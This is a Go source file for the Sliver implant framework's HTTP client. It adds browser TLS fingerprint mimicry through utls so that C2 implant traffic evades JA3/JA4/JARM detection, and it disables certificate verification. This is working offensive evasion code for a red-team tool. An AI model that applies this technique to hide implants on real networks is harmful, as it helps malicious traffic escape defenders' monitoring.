//go:build !386 && !arm
// +build !386,!arm

package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

/*
	TLS Fingerprinting Support using utls

	This file provides TLS fingerprinting capabilities to evade
	network-level detection (JA3/JA4/JARM).

	Architecture: Parallel implementation (non-breaking)
	- Original crypto/tls path preserved (see gohttp.go)
	- utls path opt-in via EnableTLSFingerprinting config flag
	- Falls back gracefully if disabled or errors occur

	Browser Fingerprints Supported:
	- Chrome (default)
	- Firefox
	- iOS Safari
	- Android Chrome
	- Microsoft Edge
	- macOS Safari

	Usage:
		config := &clientpb.ImplantConfig{
			EnableTLSFingerprinting: true,
			TLSFingerprint: "chrome",
		}

	Implementation: Milestone D - Phase 6.2
	Related: PHASE6_IMPLEMENTATION_PLAN.md
*/

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	tls "github.com/refraction-networking/utls"
)

// getBrowserID maps fingerprint names to utls ClientHelloIDs
//
// This function provides a mapping from human-readable browser names
// to utls ClientHelloID structs that define TLS handshake parameters.
//
// Supported browsers:
// - chrome: Google Chrome (Auto-updated to latest)
// - firefox: Mozilla Firefox (Auto-updated to latest)
// - ios/safari-ios: iOS Safari
// - android: Android Chrome
// - edge: Microsoft Edge
// - safari/safari-macos: macOS Safari
//
// Returns: tls.ClientHelloID with appropriate browser fingerprint
// Default: Chrome (most common, best compatibility)
func getBrowserID(fingerprint string) tls.ClientHelloID {
	// Normalize input: lowercase and trim whitespace
	fp := strings.ToLower(strings.TrimSpace(fingerprint))

	switch fp {
	case "chrome":
		return tls.HelloChrome_Auto
	case "firefox":
		return tls.HelloFirefox_Auto
	case "ios", "safari-ios":
		return tls.HelloIOS_Auto
	case "android":
		return tls.HelloAndroid_11_OkHttp
	case "edge":
		return tls.HelloEdge_Auto
	case "safari", "safari-macos":
		return tls.HelloSafari_Auto
	default:
		// Safe default: Chrome (most common, best compatibility)
		// Log warning in production: unknown fingerprint defaulting to Chrome
		return tls.HelloChrome_Auto
	}
}

// extractServerName extracts hostname from "host:port" address
//
// TLS requires the server name for SNI (Server Name Indication).
// This function handles addresses with or without ports.
//
// Examples:
//
//	extractServerName("example.com:443") -> "example.com"
//	extractServerName("example.com")     -> "example.com"
//	extractServerName("192.168.1.1:443") -> "192.168.1.1"
//
// Args:
//
//	addr: Address in "host:port" or "host" format
//
// Returns: Hostname without port
func extractServerName(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		// If no port, assume addr is just hostname
		return addr
	}
	return host
}

// dialWithUTLSHelper establishes a TLS connection using utls for fingerprinting
//
// This function implements custom TLS fingerprinting by:
// 1. Establishing a TCP connection
// 2. Wrapping it with utls.UConn (not standard crypto/tls)
// 3. Configuring the TLS handshake to mimic the specified browser
// 4. Performing the handshake
//
// The resulting connection mimics the TLS handshake of the target browser,
// evading JA3/JA4/JARM fingerprinting detection.
//
// Args:
//
//	ctx: Context for cancellation and deadlines
//	network: Network type ("tcp", "tcp4", "tcp6")
//	addr: Server address in "host:port" format
//	fingerprint: Browser to mimic (see getBrowserID)
//	timeout: Connection timeout
//
// Returns:
//
//	net.Conn: TLS connection with custom fingerprint
//	error: Any connection or handshake errors
//
// Security Notes:
//   - Uses InsecureSkipVerify: true (matches original Sliver behavior)
//   - For C2 operations, certificate validation is typically disabled
//   - Customize TLS config as needed for your operational requirements
func dialWithUTLSHelper(ctx context.Context, network, addr, fingerprint string, timeout time.Duration) (net.Conn, error) {
	// Step 1: Establish TCP connection
	// Use net.Dialer with timeout
	dialer := &net.Dialer{
		Timeout:   timeout,
		KeepAlive: 30 * time.Second, // Keep connection alive
	}

	tcpConn, err := dialer.DialContext(ctx, network, addr)
	if err != nil {
		return nil, fmt.Errorf("tcp dial failed: %w", err)
	}

	// Step 2: Configure utls TLS settings
	// Extract server name for SNI (Server Name Indication)
	serverName := extractServerName(addr)

	config := &tls.Config{
		ServerName:         serverName,
		InsecureSkipVerify: true, // Match original Sliver behavior

		// Optional: Customize these based on operational requirements
		// MinVersion:         tls.VersionTLS12,
		// MaxVersion:         tls.VersionTLS13,
		// RootCAs:            nil, // Use system roots
	}

	// Step 3: Create utls connection with browser fingerprint
	// getBrowserID maps fingerprint name to utls ClientHelloID
	browserID := getBrowserID(fingerprint)

	// UClient wraps the TCP connection with utls, using the browser fingerprint
	// This modifies the TLS ClientHello to match the target browser
	uconn := tls.UClient(tcpConn, config, browserID)

	// Step 4: Perform TLS handshake
	// This sends the ClientHello with the browser's fingerprint
	err = uconn.HandshakeContext(ctx)
	if err != nil {
		tcpConn.Close() // Clean up TCP connection on handshake failure
		return nil, fmt.Errorf("tls handshake failed: %w", err)
	}

	// Step 5: (Optional) Verify hostname if not using InsecureSkipVerify
	// Currently disabled to match Sliver's original behavior
	// if !config.InsecureSkipVerify {
	//     err = uconn.VerifyHostname(serverName)
	//     if err != nil {
	//         uconn.Close()
	//         return nil, fmt.Errorf("hostname verification failed: %w", err)
	//     }
	// }

	// Return the TLS connection
	// This connection now has a JA3/JA4 fingerprint matching the target browser
	return uconn, nil
}

// GetFingerprintInfo returns information about a fingerprint
//
// This is a utility function for debugging and logging.
// It returns the ClientHelloID details for a given fingerprint name.
//
// Args:
//
//	fingerprint: Browser name (e.g., "chrome", "firefox")
//
// Returns:
//
//	map[string]string: Information about the fingerprint
//	  - "client": Browser client name
//	  - "version": Browser version identifier
//	  - "seed": Randomization seed (if any)
//
// Example:
//
//	info := GetFingerprintInfo("chrome")
//	// Returns: {"client": "Chrome", "version": "...", "seed": "..."}
func GetFingerprintInfo(fingerprint string) map[string]string {
	id := getBrowserID(fingerprint)

	return map[string]string{
		"client":  id.Client,
		"version": id.Version,
		"seed":    id.Seed,
	}
}

// ValidateFingerprintName checks if a fingerprint name is supported
//
// This function can be used for input validation before attempting
// to establish a connection.
//
// Args:
//
//	fingerprint: Browser name to validate
//
// Returns:
//
//	bool: true if fingerprint is recognized, false otherwise
//
// Recognized fingerprints:
//
//	chrome, firefox, ios, safari-ios, android, edge, safari, safari-macos
func ValidateFingerprintName(fingerprint string) bool {
	fp := strings.ToLower(strings.TrimSpace(fingerprint))

	validNames := []string{
		"chrome",
		"firefox",
		"ios",
		"safari-ios",
		"android",
		"edge",
		"safari",
		"safari-macos",
	}

	for _, valid := range validNames {
		if fp == valid {
			return true
		}
	}

	return false
}
